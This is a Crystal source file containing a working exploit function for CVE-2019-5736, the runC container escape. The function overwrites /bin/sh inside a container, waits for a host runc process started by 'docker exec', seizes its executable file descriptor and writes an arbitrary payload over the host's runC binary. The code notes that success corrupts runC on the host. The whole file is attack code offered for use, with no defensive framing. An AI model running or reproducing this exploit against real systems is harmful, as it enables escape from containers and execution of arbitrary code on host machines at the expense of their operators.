
def cve_2019_5736(payload : String)
    puts("==== ATTEMPTING CVE-2019-5736 ====")
    puts("=> WARNING: If successful this exploit will corrupt runC on the host OS.")
    puts("• Setting up /bin/sh to point to our payload.")
    begin 
        binsh = File.new("/bin/sh", mode= "w", perm= 0o777)
        binsh.puts("#!/proc/self/exe")
        binsh.close()
        puts("•  Finished overwriting /bin/sh")
    rescue ex : Exception
        puts("!  Error when trying to overwrite /bin/sh. Exiting")
        exit(1)
    end
    valid_pid = "-1"
    puts("=> Waiting for a process referencing runc to appear.")
    puts("=> This will appear when someone runs a docker exec command on a vulnerable host.")
    while valid_pid == "-1"
        d = Dir.open("/proc/")
        d.each_child do | proc |
            if Dir.exists?("/proc/#{proc}") && File.exists?("/proc/#{proc}/cmdline") && proc.match(/^\d+$/) && File.read("/proc/#{proc}/cmdline").includes?("runc")
                puts("•  Found PID #{proc} references runC")
                valid_pid = proc
            end
        end
        d.close
    end
    fd = 0
    puts("• Trying to obtain file descriptor from PID #{valid_pid}")
    while fd == 0
        begin
            file = File.open("/proc/#{valid_pid}/exe")
            fd = file.fd
        rescue ex : Exception
        end
    end
    puts("• Got file descriptor #{fd} from PID #{valid_pid}")
    fd1 = 0
    while fd1 ==0
        begin
            runc_file = File.open("/proc/self/fd/#{fd}",mode= "w", perm= 0o700)
            fd1 = runc_file.fd
            runc_file.puts(payload)
            runc_file.close()            
        rescue ex : Exception
        end
    end
    puts("=> CVE-2019-5736 attempt finished, check if your payload executed")
end
